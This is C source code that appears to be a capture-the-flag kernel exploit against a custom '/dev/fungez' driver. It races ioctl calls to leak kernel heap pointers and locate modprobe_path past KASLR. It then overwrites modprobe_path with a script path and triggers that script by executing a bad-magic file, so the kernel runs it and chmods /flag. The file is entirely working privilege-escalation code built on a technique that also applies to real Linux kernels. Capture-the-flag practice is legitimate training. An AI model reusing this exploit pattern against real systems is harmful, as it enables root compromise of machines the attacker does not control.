#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>

#define CMD_QUERY 0x800C4F03
#define CMD_START 0x40044F02
#define CMD_SETUP 0x40204F01

struct SetupRequest {
	uint16_t height;
	uint16_t width;
	uint16_t init_x;
	uint16_t init_y;
	uint32_t code_offset;
	uint32_t input_offset;
	uint32_t output_offset;
	uint32_t stack_offset;
	uint32_t mem_size;
	uint32_t maxstep;
};

struct QueryResponse {
	uint16_t x;
	uint16_t y;
	uint32_t state;
	uint32_t step;
};

uint64_t kmalloc_addr = 0;
uint64_t offset[] = {0xffff8000116fd860, 0xffff800010ba1d80, 0xffff800010f5ddf8};
uint64_t modprobe_nokaslr = 0xffff80001159d330;
uint64_t modprobe_path = 0;

void dump(uint64_t *mem, size_t len) {
	int i;
	for (i = 0; i < len; i++){
		if (i % 2 == 0) {
			printf("[+] *%p: 0x%lx ", &mem[i], mem[i]);
		} else {
			printf(" 0x%lx\n", &mem[i], mem[i]);
		}
	}
	if (len % 2) {
		printf("\n");
	}
	return;
}

uint64_t fix_addr(uint64_t addr) {
	int i;
	if (addr == 0) return 0;
	for (i = 0; i < sizeof(offset); i++) {
		if ((addr & 0xFFF0000000000000) == 0xFFF0000000000000 && (addr & 0xFFF) == (offset[i] & 0xFFF)) {
			return addr - offset[i] + modprobe_nokaslr;
		}
	}
	return 0;
}

void fix_ptr(uint64_t *mem, size_t len) {
	int i;
	for (i = 0; i < len/sizeof(uint64_t); i++) {
		if ((mem[i] & 0xFFFFF00000000000) == (modprobe_nokaslr & 0xFFFFF00000000000)) {
			// fix this pointer
			mem[i] = modprobe_path - modprobe_nokaslr + mem[i];
		}
	}
}

int setup(int fd, struct SetupRequest * req) {
	if (ioctl(fd, CMD_SETUP, req) < 0) {
		perror("ioctl");
	}
}

int start(int fd, int start) {
	if (ioctl(fd, CMD_START, &start) < 0) {
		perror("ioctl");
	}
}

int new(size_t length, char **ptr) {
	int fd = open("/dev/fungez", O_RDWR);
	int ret;
	if (fd < 0) {
		perror("open");
	}

	*ptr = mmap(0, length, 3, 1, fd, 0);
	if (*ptr < 0) {
		perror("mmap");
	}
	printf("[+] mmap area: %p\n", *ptr);
	return fd;
}

void delete(int fd, char *ptr, int len) {
	munmap(ptr, len);
	close(fd);
}

void leak() {
	int fd1, fd2, fd3, fd4;
	char *ptr1, *ptr2, *ptr3, *ptr4;

	fd1 = new(0x2000, &ptr1);
	fd2 = new(0x1000, &ptr2);
	fd3 = new(0x1000, &ptr3);	// we assume that ptr3 is just below ptr2

	struct SetupRequest req;
	req.height = 1;
	req.width = 0x100;
	req.init_x = 0;
	req.init_y = 0;
	req.code_offset = 0;
	req.input_offset = 0x1000;
	req.output_offset = 0x1000;
	req.stack_offset = 0x80;
	req.mem_size = 0x2000;
	req.maxstep = 0xFFFFFFFF;

	memset(ptr1, 'A', 0x2000);
	setup(fd1, &req);

	struct SetupRequest req2;
	req2.height = 2;
	req2.width = 0x100;
	req2.init_x = 0;
	req2.init_y = 0;
	req2.code_offset = 0;
	req2.input_offset = 0xFFF;
	req2.output_offset = 0x100;
	req2.stack_offset = 0;
	req2.mem_size = 0x1000;
	req2.maxstep = 0xFFFFFFFF;

	memset(ptr2, 'B', 0x1000);
	strcpy(ptr2, ">~~,~,~,~,~,~,~,~,@");
	setup(fd2, &req2);

	// memset(ptr3, 'C', 0x1000);
	// strcpy(ptr3, "LeakMe!");

	delete(fd3, ptr3, 0x1000);
	sleep(0);

	// Race: modify global context with ioctl
	start(fd1, 1);
	start(fd2, 1);

	struct QueryResponse resp;
	int cnt = 10;
	while (cnt--) {
		if (ioctl(fd1, CMD_QUERY, &resp) < 0) {
			perror("query");
		}
		if (resp.state == 3) break;
		sleep(0);
	}

	uint64_t leak_ptr = *((uint64_t *)(ptr2+0x100));
	printf("[+] leak ptr: %p = %p\n", ptr2+0x100, leak_ptr);
	if (memcmp("AAAAAAAA", &leak_ptr, 8) == 0 || memcmp("BBBBBBBB", &leak_ptr, 8) == 0 || memcmp("CCCCCCCC", &leak_ptr, 8) == 0) {
		printf("[+] leak failed!\n");
		exit(1);
	}

	kmalloc_addr = leak_ptr;
	// kmalloc_addr = 0xffff000001e5d000; // hard-coded
	printf("[+] Done!\n");

	delete(fd1, ptr1, 0x2000);
	delete(fd2, ptr2, 0x1000);
	sleep(0);
	return;
}

void overwrite_ptr() {
	int fd1, fd2, fd3, fd4, fd5;
	char *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;

	fd1 = new(0x2000, &ptr1);
	fd2 = new(0x1000, &ptr2);
	fd3 = new(0x1000, &ptr3);	// we assume that ptr3 is just below ptr2

	struct SetupRequest req;
	req.height = 1;
	req.width = 0x100;
	req.init_x = 0;
	req.init_y = 0;
	req.code_offset = 0;
	req.input_offset = 0x1000;
	req.output_offset = 0x1000;
	req.stack_offset = 0x80;
	req.mem_size = 0x2000;
	req.maxstep = 0xFFFFFFFF;

	memset(ptr1, 'A', 0x2000);
	setup(fd1, &req);

	struct SetupRequest req2;
	req2.height = 2;
	req2.width = 0x100;
	req2.init_x = 0;
	req2.init_y = 0;
	req2.code_offset = 0;
	req2.input_offset = 0x100;
	req2.output_offset = 0xFFF;
	req2.stack_offset = 0;
	req2.mem_size = 0x1000;
	req2.maxstep = 0xFFFFFFFF;

	memset(ptr2, 'B', 0x1000);
	strcpy(ptr2, ">,~,~,~,~,~,~,~,~,~@");
	setup(fd2, &req2);

	uint64_t fd_ptr = kmalloc_addr - 0x10000 + 0x100 - 0x1000;
	uint64_t align = fd_ptr & 0xFFF;
	*(uint64_t *)(ptr2+0x100) = fd_ptr;

	delete(fd3, ptr3, 0x1000);
	sleep(0);

	// Race: modify global context with ioctl
	start(fd1, 1);
	start(fd2, 1);

	struct QueryResponse resp;
	int cnt = 10;
	while (cnt--) {
		if (ioctl(fd1, CMD_QUERY, &resp) < 0) {
			perror("query");
		}
		if (resp.state == 3) break;
		sleep(0);
	}

	printf("[+] Leak modprobe_path!\n");

	fd3 = new(0x1000, &ptr3);
	fd4 = new(0x1000, &ptr4);
	ptr4 += align;				// offset of page

	fd5 = new(0x2000, &ptr5);

	req.height = 1;
	req.width = 0x100;
	req.init_x = 0;
	req.init_y = 0;
	req.code_offset = 0;
	req.input_offset = 0x1000;
	req.output_offset = 0x1000;
	req.stack_offset = 0x80;
	req.mem_size = 0x2000;
	req.maxstep = 0xFFFFFFFF;
	setup(fd5, &req);
	memset(ptr5, 'C', 0x2000);

	req2.height = 2;
	req2.width = 0x100;
	req2.init_x = 0;
	req2.init_y = 0;
	req2.code_offset = 0;
	req2.input_offset = 0xFFF;
	req2.output_offset = 0x100;
	req2.stack_offset = 0;
	req2.mem_size = 0x1000;
	req2.maxstep = 0xFFFFFFFF;
	setup(fd4, &req2);
	memset(ptr4, 'D', 0x1000);
	strcpy(ptr4, ">~~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,~,@");

	start(fd5, 1);
	start(fd4, 1);

	cnt = 10;
	while (cnt--) {
		if (ioctl(fd5, CMD_QUERY, &resp) < 0) {
			perror("query");
		}
		if (resp.state == 3) break;
		sleep(0);
	}

	uint64_t *leak_arr = (uint64_t *)(ptr4+0x100);
	for (cnt = 0; cnt < 10; cnt++) {
		uint64_t leak_ptr = leak_arr[cnt];
		printf("[+] leak ptr: %p = %p\n", &leak_arr[cnt], leak_ptr);
		modprobe_path = fix_addr(leak_ptr);
		if (modprobe_path != 0) {
			break;
		}
	}

	printf("[+] modprobe_path @ %p\n", modprobe_path);

	if ((modprobe_path & 0xFFF) != 0x330) {
		printf("[!] Leak error!\n");
		exit(1);
	}

	delete(fd1, ptr1, 0x2000);
	delete(fd2, ptr2, 0x1000);
	delete(fd3, ptr3, 0x1000);
	delete(fd5, ptr5, 0x2000);
	sleep(0);
	return;
}

void overwrite_modprobe() {

	int fd1, fd2, fd3, fd4, fd5;
	char *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;

	fd1 = new(0x2000, &ptr1);
	fd3 = new(0x1000, &ptr3);
	fd2 = new(0x1000, &ptr2);

	struct SetupRequest req;
	req.height = 1;
	req.width = 0x100;
	req.init_x = 0;
	req.init_y = 0;
	req.code_offset = 0;
	req.input_offset = 0x1000;
	req.output_offset = 0x1000;
	req.stack_offset = 0x80;
	req.mem_size = 0x2000;
	req.maxstep = 0xFFFFFFFF;

	memset(ptr1, 'A', 0x2000);
	setup(fd1, &req);

	struct SetupRequest req2;
	req2.height = 2;
	req2.width = 0x100;
	req2.init_x = 0;
	req2.init_y = 0;
	req2.code_offset = 0;
	req2.input_offset = 0x100;
	req2.output_offset = 0xFFF;
	req2.stack_offset = 0;
	req2.mem_size = 0x1000;
	req2.maxstep = 0xFFFFFFFF;

	memset(ptr2, 'B', 0x1000);
	strcpy(ptr2, ">,~,~,~,~,~,~,~,~,~@");
	setup(fd2, &req2);

	*(uint64_t *)(ptr2+0x100) = modprobe_path & (~0xFFF);

	delete(fd3, ptr3, 0x1000);
	sleep(0);

	// Race: modify global context with ioctl
	start(fd1, 1);
	start(fd2, 1);

	struct QueryResponse resp;
	int cnt = 10;
	while (cnt--) {
		if (ioctl(fd1, CMD_QUERY, &resp) < 0) {
			perror("query");
		}
		if (resp.state == 3) break;
		sleep(0);
	}

	printf("[+] Stage 4\n");
	fd4 = new(0x1000, &ptr4);
	fd5 = new(0x1000, &ptr5);

	int fd = open("page.bin", O_RDONLY);
	if (fd < 0) {
		perror("open page");
	}
	read(fd, ptr5, 0x1000);

	// fix all pointers
	fix_ptr(ptr5, 0x1000);

	// Overwrite modprobe_path, pay attention to page alignment
	strcpy((char *)(ptr5+0x330), "/tmp/getflag.sh");

	int ret = 0;
	if (fork() == 0) {
		while (1) {
			ret = system("ls -lh /; cat /flag");
			if (ret == 0) exit(0);
			sleep(3);
		}
	}

	execve("/tmp/unknown_exe", NULL, NULL);
}

int main(int argc, char **argv) {
	// Preparation
	system("echo -ne '\xff\xff\xff\xff' > /tmp/unknown_exe");
	system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/getflag.sh");
	system("chmod +x /tmp/unknown_exe /tmp/getflag.sh");

	leak();
	overwrite_ptr();
	overwrite_modprobe();
}